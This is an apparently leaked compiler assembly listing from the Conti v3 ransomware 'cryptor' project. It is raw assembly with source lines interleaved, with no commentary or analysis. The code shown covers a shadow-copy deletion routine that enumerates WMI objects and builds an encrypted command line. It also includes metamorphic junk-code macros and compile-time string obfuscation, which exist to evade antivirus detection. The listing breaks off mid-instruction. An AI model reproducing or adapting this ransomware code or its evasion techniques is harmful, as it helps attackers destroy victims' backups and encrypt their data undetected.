; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  00eeb	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00ef0	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$7[rsp]
  00ef4	f7 e9		 imul	 ecx
  00ef6	8b c2		 mov	 eax, edx
  00ef8	c1 e8 1f	 shr	 eax, 31
  00efb	03 d0		 add	 edx, eax
  00efd	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00f00	3b c8		 cmp	 ecx, eax
  00f02	75 2f		 jne	 SHORT $LN1250@DeleteShad
  00f04	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL1186@DeleteShad:
  00f10	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$7[rsp]
  00f14	ff c0		 inc	 eax
  00f16	89 44 24 50	 mov	 DWORD PTR _morph_var$7[rsp], eax
  00f1a	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00f1f	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$7[rsp]
  00f23	f7 e9		 imul	 ecx
  00f25	8b c2		 mov	 eax, edx
  00f27	c1 e8 1f	 shr	 eax, 31
  00f2a	03 d0		 add	 edx, eax
  00f2c	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00f2f	3b c8		 cmp	 ecx, eax
  00f31	74 dd		 je	 SHORT $LL1186@DeleteShad
$LN1250@DeleteShad:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 235  : 	while (pEnumerator)

  00f33	48 8b 8d b8 00
	00 00		 mov	 rcx, QWORD PTR pEnumerator$[rbp-256]
  00f3a	48 85 c9	 test	 rcx, rcx
  00f3d	0f 84 0a 08 00
	00		 je	 $LN1473@DeleteShad
  00f43	0f 1f 40 00 66
	0f 1f 84 00 00
	00 00 00	 npad	 13
$LL2@DeleteShad:

; 236  : 	{
; 237  : 		HRESULT hr = pEnumerator->Next(WBEM_INFINITE, 1,

  00f50	48 8b 01	 mov	 rax, QWORD PTR [rcx]
  00f53	48 8d 95 e8 00
	00 00		 lea	 rdx, QWORD PTR uReturn$[rbp-256]
  00f5a	48 89 54 24 20	 mov	 QWORD PTR [rsp+32], rdx
  00f5f	4c 8d 8d c8 00
	00 00		 lea	 r9, QWORD PTR pclsObj$[rbp-256]
  00f66	ba ff ff ff ff	 mov	 edx, -1
  00f6b	45 8b c6	 mov	 r8d, r14d
  00f6e	ff 50 20	 call	 QWORD PTR [rax+32]
  00f71	44 8b c0	 mov	 r8d, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00f74	c7 44 24 50 c1
	9b 17 00	 mov	 DWORD PTR _morph_var$17[rsp], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  00f7c	8b 7c 24 50	 mov	 edi, DWORD PTR _morph_var$17[rsp]
  00f80	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00f85	f7 ef		 imul	 edi
  00f87	8b ca		 mov	 ecx, edx
  00f89	c1 e9 1f	 shr	 ecx, 31
  00f8c	03 d1		 add	 edx, ecx
  00f8e	8d 0c 52	 lea	 ecx, DWORD PTR [rdx+rdx*2]
  00f91	3b f9		 cmp	 edi, ecx
  00f93	74 4d		 je	 SHORT $LN120@DeleteShad

; 49   : 		_morph_var += (int)a + 2;

  00f95	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$17[rsp]
  00f99	83 c1 02	 add	 ecx, 2
  00f9c	41 03 c8	 add	 ecx, r8d
  00f9f	89 4c 24 50	 mov	 DWORD PTR _morph_var$17[rsp], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00fa3	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$17[rsp]
  00fa7	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00fac	7d 07		 jge	 SHORT $LN1442@DeleteShad
  00fae	ff c8		 dec	 eax
  00fb0	83 c8 fc	 or	 eax, -4
  00fb3	ff c0		 inc	 eax
$LN1442@DeleteShad:
  00fb5	85 c0		 test	 eax, eax
  00fb7	75 7b		 jne	 SHORT $LN119@DeleteShad
  00fb9	0f 1f 80 00 00
	00 00		 npad	 7
$LL112@DeleteShad:
  00fc0	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$17[rsp]
  00fc4	ff c0		 inc	 eax
  00fc6	89 44 24 50	 mov	 DWORD PTR _morph_var$17[rsp], eax
  00fca	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$17[rsp]
  00fce	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00fd3	7d 07		 jge	 SHORT $LN1441@DeleteShad
  00fd5	ff c8		 dec	 eax
  00fd7	83 c8 fc	 or	 eax, -4
  00fda	ff c0		 inc	 eax
$LN1441@DeleteShad:
  00fdc	85 c0		 test	 eax, eax
  00fde	74 e0		 je	 SHORT $LL112@DeleteShad

; 51   : 	}

  00fe0	eb 52		 jmp	 SHORT $LN119@DeleteShad
$LN120@DeleteShad:

; 52   : 	else if (_morph_var % 2) {

  00fe2	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$17[rsp]

; 53   : 		_morph_var -= (int)a - 2;

  00fe6	b9 02 00 00 00	 mov	 ecx, 2
  00feb	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$17[rsp]
  00fef	41 2b c8	 sub	 ecx, r8d
  00ff2	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  00ff4	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00ff9	89 4c 24 50	 mov	 DWORD PTR _morph_var$17[rsp], ecx
  00ffd	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$17[rsp]
  01001	f7 e9		 imul	 ecx
  01003	8b c2		 mov	 eax, edx
  01005	c1 e8 1f	 shr	 eax, 31
  01008	03 d0		 add	 edx, eax
  0100a	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0100d	3b c8		 cmp	 ecx, eax
  0100f	75 23		 jne	 SHORT $LN119@DeleteShad
$LL114@DeleteShad:
  01011	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$17[rsp]
  01015	ff c0		 inc	 eax
  01017	89 44 24 50	 mov	 DWORD PTR _morph_var$17[rsp], eax
  0101b	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  01020	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$17[rsp]
  01024	f7 e9		 imul	 ecx
  01026	8b c2		 mov	 eax, edx
  01028	c1 e8 1f	 shr	 eax, 31
  0102b	03 d0		 add	 edx, eax
  0102d	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  01030	3b c8		 cmp	 ecx, eax
  01032	74 dd		 je	 SHORT $LL114@DeleteShad
$LN119@DeleteShad:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 242  : 		if (0 == uReturn)

  01034	39 b5 e8 00 00
	00		 cmp	 DWORD PTR uReturn$[rbp-256], esi
  0103a	0f 84 0d 07 00
	00		 je	 $LN1473@DeleteShad
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  01040	40 88 74 24 54	 mov	 BYTE PTR $T5[rsp], sil
  01045	c6 44 24 55 26	 mov	 BYTE PTR $T5[rsp+1], 38	; 00000026H
  0104a	c6 44 24 56 5d	 mov	 BYTE PTR $T5[rsp+2], 93	; 0000005dH
  0104f	c6 44 24 57 57	 mov	 BYTE PTR $T5[rsp+3], 87	; 00000057H
  01054	c6 44 24 58 5d	 mov	 BYTE PTR $T5[rsp+4], 93	; 0000005dH
  01059	c6 44 24 59 5d	 mov	 BYTE PTR $T5[rsp+5], 93	; 0000005dH
  0105e	c6 44 24 5a 5d	 mov	 BYTE PTR $T5[rsp+6], 93	; 0000005dH
  01063	0f b6 44 24 55	 movzx	 eax, BYTE PTR $T5[rsp+1]

; 58   :         return m_isDecrypted;

  01068	0f b6 44 24 54	 movzx	 eax, BYTE PTR $T5[rsp]

; 63   :         if (!isDecrypted())

  0106d	84 c0		 test	 al, al
  0106f	75 5a		 jne	 SHORT $LN351@DeleteShad

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  01071	48 8b fe	 mov	 rdi, rsi
  01074	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL352@DeleteShad:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  01080	0f b6 4c 3c 55	 movzx	 ecx, BYTE PTR $T5[rsp+rdi+1]

; 40   :     return (a % n + n) % n;

  01085	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0108a	83 e9 5d	 sub	 ecx, 93			; 0000005dH
  0108d	6b c9 1f	 imul	 ecx, ecx, 31

; 40   :     return (a % n + n) % n;

  01090	f7 e9		 imul	 ecx
  01092	03 d1		 add	 edx, ecx
  01094	c1 fa 06	 sar	 edx, 6
  01097	8b c2		 mov	 eax, edx
  01099	c1 e8 1f	 shr	 eax, 31
  0109c	03 d0		 add	 edx, eax
  0109e	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  010a1	2b c8		 sub	 ecx, eax
  010a3	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  010a8	83 c1 7f	 add	 ecx, 127		; 0000007fH
  010ab	f7 e9		 imul	 ecx
  010ad	03 d1		 add	 edx, ecx
  010af	c1 fa 06	 sar	 edx, 6
  010b2	8b c2		 mov	 eax, edx
  010b4	c1 e8 1f	 shr	 eax, 31
  010b7	03 d0		 add	 edx, eax
  010b9	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  010bc	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  010be	88 4c 3c 55	 mov	 BYTE PTR $T5[rsp+rdi+1], cl
  010c2	48 ff c7	 inc	 rdi
  010c5	48 83 ff 06	 cmp	 rdi, 6
  010c9	72 b5		 jb	 SHORT $LL352@DeleteShad
$LN351@DeleteShad:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 250  : 		hr = pclsObj->Get(OBFW(L"ID"), 0, &vtProp, 0, 0);

  010cb	48 8b 8d c8 00
	00 00		 mov	 rcx, QWORD PTR pclsObj$[rbp-256]
  010d2	4c 8d 8d d0 00
	00 00		 lea	 r9, QWORD PTR vtProp$23[rbp-256]
  010d9	48 89 74 24 28	 mov	 QWORD PTR [rsp+40], rsi
  010de	48 8d 54 24 55	 lea	 rdx, QWORD PTR $T5[rsp+1]
  010e3	45 33 c0	 xor	 r8d, r8d
  010e6	48 89 74 24 20	 mov	 QWORD PTR [rsp+32], rsi
  010eb	48 8b 01	 mov	 rax, QWORD PTR [rcx]
  010ee	ff 50 20	 call	 QWORD PTR [rax+32]
  010f1	44 8b c0	 mov	 r8d, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  010f4	c7 44 24 50 c1
	9b 17 00	 mov	 DWORD PTR _morph_var$10[rsp], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  010fc	8b 7c 24 50	 mov	 edi, DWORD PTR _morph_var$10[rsp]
  01100	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  01105	f7 ef		 imul	 edi
  01107	8b ca		 mov	 ecx, edx
  01109	c1 e9 1f	 shr	 ecx, 31
  0110c	03 d1		 add	 edx, ecx
  0110e	8d 0c 52	 lea	 ecx, DWORD PTR [rdx+rdx*2]
  01111	3b f9		 cmp	 edi, ecx
  01113	74 4d		 je	 SHORT $LN370@DeleteShad

; 49   : 		_morph_var += (int)a + 2;

  01115	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$10[rsp]
  01119	83 c1 02	 add	 ecx, 2
  0111c	41 03 c8	 add	 ecx, r8d
  0111f	89 4c 24 50	 mov	 DWORD PTR _morph_var$10[rsp], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  01123	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$10[rsp]
  01127	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  0112c	7d 07		 jge	 SHORT $LN1439@DeleteShad
  0112e	ff c8		 dec	 eax
  01130	83 c8 fc	 or	 eax, -4
  01133	ff c0		 inc	 eax
$LN1439@DeleteShad:
  01135	85 c0		 test	 eax, eax
  01137	75 7b		 jne	 SHORT $LN369@DeleteShad
  01139	0f 1f 80 00 00
	00 00		 npad	 7
$LL362@DeleteShad:
  01140	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$10[rsp]
  01144	ff c0		 inc	 eax
  01146	89 44 24 50	 mov	 DWORD PTR _morph_var$10[rsp], eax
  0114a	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$10[rsp]
  0114e	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  01153	7d 07		 jge	 SHORT $LN1438@DeleteShad
  01155	ff c8		 dec	 eax
  01157	83 c8 fc	 or	 eax, -4
  0115a	ff c0		 inc	 eax
$LN1438@DeleteShad:
  0115c	85 c0		 test	 eax, eax
  0115e	74 e0		 je	 SHORT $LL362@DeleteShad

; 51   : 	}

  01160	eb 52		 jmp	 SHORT $LN369@DeleteShad
$LN370@DeleteShad:

; 52   : 	else if (_morph_var % 2) {

  01162	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$10[rsp]

; 53   : 		_morph_var -= (int)a - 2;

  01166	b9 02 00 00 00	 mov	 ecx, 2
  0116b	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$10[rsp]
  0116f	41 2b c8	 sub	 ecx, r8d
  01172	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  01174	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  01179	89 4c 24 50	 mov	 DWORD PTR _morph_var$10[rsp], ecx
  0117d	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$10[rsp]
  01181	f7 e9		 imul	 ecx
  01183	8b c2		 mov	 eax, edx
  01185	c1 e8 1f	 shr	 eax, 31
  01188	03 d0		 add	 edx, eax
  0118a	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  0118d	3b c8		 cmp	 ecx, eax
  0118f	75 23		 jne	 SHORT $LN369@DeleteShad
$LL364@DeleteShad:
  01191	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$10[rsp]
  01195	ff c0		 inc	 eax
  01197	89 44 24 50	 mov	 DWORD PTR _morph_var$10[rsp], eax
  0119b	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  011a0	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$10[rsp]
  011a4	f7 e9		 imul	 ecx
  011a6	8b c2		 mov	 eax, edx
  011a8	c1 e8 1f	 shr	 eax, 31
  011ab	03 d0		 add	 edx, eax
  011ad	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  011b0	3b c8		 cmp	 ecx, eax
  011b2	74 dd		 je	 SHORT $LL364@DeleteShad
$LN369@DeleteShad:
; File C:\Program Files (x86)\Windows Kits\10\Include\10.0.22621.0\um\winnt.h

; 21771:     __stosb((PBYTE )((DWORD64)vptr), 0, cnt);

  011b4	33 c0		 xor	 eax, eax
  011b6	48 8d bd 40 01
	00 00		 lea	 rdi, QWORD PTR CmdLine$25[rbp-256]
  011bd	b9 00 08 00 00	 mov	 ecx, 2048		; 00000800H
  011c2	f3 aa		 rep stosb
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  011c4	88 45 00	 mov	 BYTE PTR $T6[rbp-256], al
  011c7	c6 45 01 3d	 mov	 BYTE PTR $T6[rbp-255], 61 ; 0000003dH
  011cb	c6 45 02 12	 mov	 BYTE PTR $T6[rbp-254], 18
  011cf	c6 45 03 5b	 mov	 BYTE PTR $T6[rbp-253], 91 ; 0000005bH
  011d3	c6 45 04 12	 mov	 BYTE PTR $T6[rbp-252], 18
  011d7	c6 45 05 40	 mov	 BYTE PTR $T6[rbp-251], 64 ; 00000040H
  011db	c6 45 06 12	 mov	 BYTE PTR $T6[rbp-250], 18
  011df	c6 45 07 1d	 mov	 BYTE PTR $T6[rbp-249], 29
  011e3	c6 45 08 12	 mov	 BYTE PTR $T6[rbp-248], 18
  011e7	c6 45 09 43	 mov	 BYTE PTR $T6[rbp-247], 67 ; 00000043H
  011eb	c6 45 0a 12	 mov	 BYTE PTR $T6[rbp-246], 18
  011ef	c6 45 0b 7c	 mov	 BYTE PTR $T6[rbp-245], 124 ; 0000007cH
  011f3	c6 45 0c 12	 mov	 BYTE PTR $T6[rbp-244], 18
  011f7	c6 45 0d 43	 mov	 BYTE PTR $T6[rbp-243], 67 ; 00000043H
  011fb	c6 45 0e 12	 mov	 BYTE PTR $T6[rbp-242], 18
  011ff	c6 45 0f 72	 mov	 BYTE PTR $T6[rbp-241], 114 ; 00000072H
  01203	c6 45 10 12	 mov	 BYTE PTR $T6[rbp-240], 18
  01207	c6 45 11 20	 mov	 BYTE PTR $T6[rbp-239], 32 ; 00000020H
  0120b	c6 45 12 12	 mov	 BYTE PTR $T6[rbp-238], 18
  0120f	c6 45 13 3d	 mov	 BYTE PTR $T6[rbp-237], 61 ; 0000003dH
  01213	c6 45 14 12	 mov	 BYTE PTR $T6[rbp-236], 18
  01217	c6 45 15 72	 mov	 BYTE PTR $T6[rbp-235], 114 ; 00000072H
  0121b	c6 45 16 12	 mov	 BYTE PTR $T6[rbp-234], 18
  0121f	c6 45 17 5c	 mov	 BYTE PTR $T6[rbp-233], 92 ; 0000005cH
  01223	c6 45 18 12	 mov	 BYTE PTR $T6[rbp-232], 18
  01227	c6 45 19 41	 mov	 BYTE PTR $T6[rbp-231], 65 ; 00000041H
  0122b	c6 45 1a 12	 mov	 BYTE PTR $T6[rbp-230], 18
  0122f	c6 45 1b 28	 mov	 BYTE PTR $T6[rbp-229], 40 ; 00000028H
  01233	c6 45 1c 12	 mov	 BYTE PTR $T6[rbp-228], 18
  01237	c6 45 1d 19	 mov	 BYTE PTR $T6[rbp-227], 25
  0123b	c6 45 1e 12	 mov	 BYTE PTR $T6[rbp-226], 18
  0123f	c6 45 1f 4f	 mov	 BYTE PTR $T6[rbp-225], 79 ; 0000004fH
  01243	c6 45 20 12	 mov	 BYTE PTR $T6[rbp-224], 18
  01247	c6 45 21 5e	 mov	 BYTE PTR $T6[rbp-223], 94 ; 0000005eH
  0124b	c6 45 22 12	 mov	 BYTE PTR $T6[rbp-222], 18
  0124f	c6 45 23 40	 mov	 BYTE PTR $T6[rbp-221], 64 ; 00000040H
  01253	c6 45 24 12	 mov	 BYTE PTR $T6[rbp-220], 18
  01257	c6 45 25 61	 mov	 BYTE PTR $T6[rbp-219], 97 ; 00000061H
  0125b	c6 45 26 12	 mov	 BYTE PTR $T6[rbp-218], 18
  0125f	c6 45 27 79	 mov	 BYTE PTR $T6[rbp-217], 121 ; 00000079H
  01263	c6 45 28 12	 mov	 BYTE PTR $T6[rbp-216], 18
  01267	c6 45 29 6d	 mov	 BYTE PTR $T6[rbp-215], 109 ; 0000006dH
  0126b	c6 45 2a 12	 mov	 BYTE PTR $T6[rbp-214], 18
  0126f	c6 45 2b 28	 mov	 BYTE PTR $T6[rbp-213], 40 ; 00000028H
  01273	c6 45 2c 12	 mov	 BYTE PTR $T6[rbp-212], 18
  01277	c6 45 2d 0d	 mov	 BYTE PTR $T6[rbp-211], 13
  0127b	c6 45 2e 12	 mov	 BYTE PTR $T6[rbp-210], 18
  0127f	88 45 2f	 mov	 BYTE PTR $T6[rbp-209], al
  01282	c6 45 30 12	 mov	 BYTE PTR $T6[rbp-208], 18
  01286	c6 45 31 6d	 mov	 BYTE PTR $T6[rbp-207], 109 ; 0000006dH
  0128a	c6 45 32 12	 mov	 BYTE PTR $T6[rbp-206], 18
  0128e	c6 45 33 70	 mov	 BYTE PTR $T6[rbp-205], 112 ; 00000070H
  01292	c6 45 34 12	 mov	 BYTE PTR $T6[rbp-204], 18
  01296	c6 45 35 43	 mov	 BYTE PTR $T6[rbp-203], 67 ; 00000043H
  0129a	c6 45 36 12	 mov	 BYTE PTR $T6[rbp-202], 18
  0129e	c6 45 37 5b	 mov	 BYTE PTR $T6[rbp-201], 91 ; 0000005bH
  012a2	c6 45 38 12	 mov	 BYTE PTR $T6[rbp-200], 18
  012a6	c6 45 39 2c	 mov	 BYTE PTR $T6[rbp-199], 44 ; 0000002cH
  012aa	c6 45 3a 12	 mov	 BYTE PTR $T6[rbp-198], 18
  012ae	c6 45 3b 29	 mov	 BYTE PTR $T6[rbp-197], 41 ; 00000029H
  012b2	c6 45 3c 12	 mov	 BYTE PTR $T6[rbp-196], 18
  012b6	c6 45 3d 28	 mov	 BYTE PTR $T6[rbp-195], 40 ; 00000028H
  012ba	c6 45 3e 12	 mov	 BYTE PTR $T6[rbp-194], 18
  012be	c6 45 3f 79	 mov	 BYTE PTR $T6[rbp-193], 121 ; 00000079H
  012c2	c6 45 40 12	 mov	 BYTE PTR $T6[rbp-192], 18
  012c6	c6 45 41 3a	 mov	 BYTE PTR $T6[rbp-191], 58 ; 0000003aH
  012ca	c6 45 42 12	 mov	 BYTE PTR $T6[rbp-190], 18
  012ce	c6 45 43 43	 mov	 BYTE PTR $T6[rbp-189], 67 ; 00000043H
  012d2	c6 45 44 12	 mov	 BYTE PTR $T6[rbp-188], 18
  012d6	c6 45 45 5b	 mov	 BYTE PTR $T6[rbp-187], 91 ; 0000005bH
  012da	c6 45 46 12	 mov	 BYTE PTR $T6[rbp-186], 18
  012de	c6 45 47 28	 mov	 BYTE PTR $T6[rbp-185], 40 ; 00000028H
  012e2	c6 45 48 12	 mov	 BYTE PTR $T6[rbp-184], 18
  012e6	c6 45 49 19	 mov	 BYTE PTR $T6[rbp-183], 25
  012ea	c6 45 4a 12	 mov	 BYTE PTR $T6[rbp-182], 18
  012ee	c6 45 4b 7a	 mov	 BYTE PTR $T6[rbp-181], 122 ; 0000007aH
  012f2	c6 45 4c 12	 mov	 BYTE PTR $T6[rbp-180], 18

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  012f6	c6 45 4d 6e	 mov	 BYTE PTR $T6[rbp-179], 110 ; 0000006eH
  012fa	c6 45 4e 12	 mov	 BYTE PTR $T6[rbp-178], 18
  012fe	c6 45 4f 5c	 mov	 BYTE PTR $T6[rbp-177], 92 ; 0000005cH
  01302	c6 45 50 12	 mov	 BYTE PTR $T6[rbp-176], 18
  01306	c6 45 51 1d	 mov	 BYTE PTR $T6[rbp-175], 29
  0130a	c6 45 52 12	 mov	 BYTE PTR $T6[rbp-174], 18
  0130e	c6 45 53 43	 mov	 BYTE PTR $T6[rbp-173], 67 ; 00000043H
  01312	c6 45 54 12	 mov	 BYTE PTR $T6[rbp-172], 18
  01316	c6 45 55 7c	 mov	 BYTE PTR $T6[rbp-171], 124 ; 0000007cH
  0131a	c6 45 56 12	 mov	 BYTE PTR $T6[rbp-170], 18
  0131e	c6 45 57 43	 mov	 BYTE PTR $T6[rbp-169], 67 ; 00000043H
  01322	c6 45 58 12	 mov	 BYTE PTR $T6[rbp-168], 18
  01326	c6 45 59 72	 mov	 BYTE PTR $T6[rbp-167], 114 ; 00000072H
  0132a	c6 45 5a 12	 mov	 BYTE PTR $T6[rbp-166], 18
  0132e	c6 45 5b 6d	 mov	 BYTE PTR $T6[rbp-165], 109 ; 0000006dH
  01332	c6 45 5c 12	 mov	 BYTE PTR $T6[rbp-164], 18
  01336	c6 45 5d 4c	 mov	 BYTE PTR $T6[rbp-163], 76 ; 0000004cH
  0133a	c6 45 5e 12	 mov	 BYTE PTR $T6[rbp-162], 18
  0133e	c6 45 5f 37	 mov	 BYTE PTR $T6[rbp-161], 55 ; 00000037H
  01342	c6 45 60 12	 mov	 BYTE PTR $T6[rbp-160], 18
  01346	c6 45 61 40	 mov	 BYTE PTR $T6[rbp-159], 64 ; 00000040H
  0134a	c6 45 62 12	 mov	 BYTE PTR $T6[rbp-158], 18
  0134e	c6 45 63 61	 mov	 BYTE PTR $T6[rbp-157], 97 ; 00000061H
  01352	c6 45 64 12	 mov	 BYTE PTR $T6[rbp-156], 18
  01356	c6 45 65 79	 mov	 BYTE PTR $T6[rbp-155], 121 ; 00000079H
  0135a	c6 45 66 12	 mov	 BYTE PTR $T6[rbp-154], 18
  0135e	c6 45 67 3d	 mov	 BYTE PTR $T6[rbp-153], 61 ; 0000003dH
  01362	c6 45 68 12	 mov	 BYTE PTR $T6[rbp-152], 18
  01366	c6 45 69 61	 mov	 BYTE PTR $T6[rbp-151], 97 ; 00000061H
  0136a	c6 45 6a 12	 mov	 BYTE PTR $T6[rbp-150], 18
  0136e	c6 45 6b 64	 mov	 BYTE PTR $T6[rbp-149], 100 ; 00000064H
  01372	c6 45 6c 12	 mov	 BYTE PTR $T6[rbp-148], 18
  01376	88 45 6d	 mov	 BYTE PTR $T6[rbp-147], al
  01379	c6 45 6e 12	 mov	 BYTE PTR $T6[rbp-146], 18
  0137d	c6 45 6f 72	 mov	 BYTE PTR $T6[rbp-145], 114 ; 00000072H
  01381	c6 45 70 12	 mov	 BYTE PTR $T6[rbp-144], 18
  01385	c6 45 71 79	 mov	 BYTE PTR $T6[rbp-143], 121 ; 00000079H
  01389	c6 45 72 12	 mov	 BYTE PTR $T6[rbp-142], 18
  0138d	c6 45 73 4c	 mov	 BYTE PTR $T6[rbp-141], 76 ; 0000004cH
  01391	c6 45 74 12	 mov	 BYTE PTR $T6[rbp-140], 18
  01395	c6 45 75 43	 mov	 BYTE PTR $T6[rbp-139], 67 ; 00000043H
  01399	c6 45 76 12	 mov	 BYTE PTR $T6[rbp-138], 18
  0139d	c6 45 77 6a	 mov	 BYTE PTR $T6[rbp-137], 106 ; 0000006aH
  013a1	c6 45 78 12	 mov	 BYTE PTR $T6[rbp-136], 18
  013a5	c6 45 79 43	 mov	 BYTE PTR $T6[rbp-135], 67 ; 00000043H
  013a9	c6 45 7a 12	 mov	 BYTE PTR $T6[rbp-134], 18
  013ad	c6 45 7b 72	 mov	 BYTE PTR $T6[rbp-133], 114 ; 00000072H
  013b1	c6 45 7c 12	 mov	 BYTE PTR $T6[rbp-132], 18
  013b5	c6 45 7d 78	 mov	 BYTE PTR $T6[rbp-131], 120 ; 00000078H
  013b9	c6 45 7e 12	 mov	 BYTE PTR $T6[rbp-130], 18
  013bd	c6 45 7f 6e	 mov	 BYTE PTR $T6[rbp-129], 110 ; 0000006eH
  013c1	c6 85 80 00 00
	00 12		 mov	 BYTE PTR $T6[rbp-128], 18
  013c8	c6 85 81 00 00
	00 5f		 mov	 BYTE PTR $T6[rbp-127], 95 ; 0000005fH
  013cf	c6 85 82 00 00
	00 12		 mov	 BYTE PTR $T6[rbp-126], 18
  013d6	c6 85 83 00 00
	00 4a		 mov	 BYTE PTR $T6[rbp-125], 74 ; 0000004aH
  013dd	c6 85 84 00 00
	00 12		 mov	 BYTE PTR $T6[rbp-124], 18
  013e4	c6 85 85 00 00
	00 08		 mov	 BYTE PTR $T6[rbp-123], 8
  013eb	c6 85 86 00 00
	00 12		 mov	 BYTE PTR $T6[rbp-122], 18
  013f2	c6 85 87 00 00
	00 02		 mov	 BYTE PTR $T6[rbp-121], 2
  013f9	c6 85 88 00 00
	00 12		 mov	 BYTE PTR $T6[rbp-120], 18
  01400	c6 85 89 00 00
	00 6d		 mov	 BYTE PTR $T6[rbp-119], 109 ; 0000006dH
  01407	c6 85 8a 00 00
	00 12		 mov	 BYTE PTR $T6[rbp-118], 18
  0140e	c6 85 8b 00 00
	00 08		 mov	 BYTE PTR $T6[rbp-117], 8
  01415	c6 85 8c 00 00
	00 12		 mov	 BYTE PTR $T6[rbp-116], 18
  0141c	c6 85 8d 00 00
	00 78		 mov	 BYTE PTR $T6[rbp-115], 120 ; 00000078H
  01423	c6 85 8e 00 00
	00 12		 mov	 BYTE PTR $T6[rbp-114], 18
  0142a	c6 85 8f 00 00
	00 72		 mov	 BYTE PTR $T6[rbp-113], 114 ; 00000072H
  01431	c6 85 90 00 00
	00 12		 mov	 BYTE PTR $T6[rbp-112], 18
  01438	c6 85 91 00 00
	00 40		 mov	 BYTE PTR $T6[rbp-111], 64 ; 00000040H
  0143f	c6 85 92 00 00
	00 12		 mov	 BYTE PTR $T6[rbp-110], 18
  01446	c6 85 93 00 00
	00 43		 mov	 BYTE PTR $T6[rbp-109], 67 ; 00000043H
  0144d	c6 85 94 00 00
	00 12		 mov	 BYTE PTR $T6[rbp-108], 18
  01454	c6 85 95 00 00
	00 58		 mov	 BYTE PTR $T6[rbp-107], 88 ; 00000058H
  0145b	c6 85 96 00 00
	00 12		 mov	 BYTE PTR $T6[rbp-106], 18
  01462	c6 85 97 00 00
	00 43		 mov	 BYTE PTR $T6[rbp-105], 67 ; 00000043H
  01469	c6 85 98 00 00
	00 12		 mov	 BYTE PTR $T6[rbp-104], 18
  01470	c6 85 99 00 00
	00 70		 mov	 BYTE PTR $T6[rbp-103], 112 ; 00000070H
  01477	c6 85 9a 00 00
	00 12		 mov	 BYTE PTR $T6[rbp-102], 18
  0147e	c6 85 9b 00 00
	00 43		 mov	 BYTE PTR $T6[rbp-101], 67 ; 00000043H
  01485	c6 85 9c 00 00
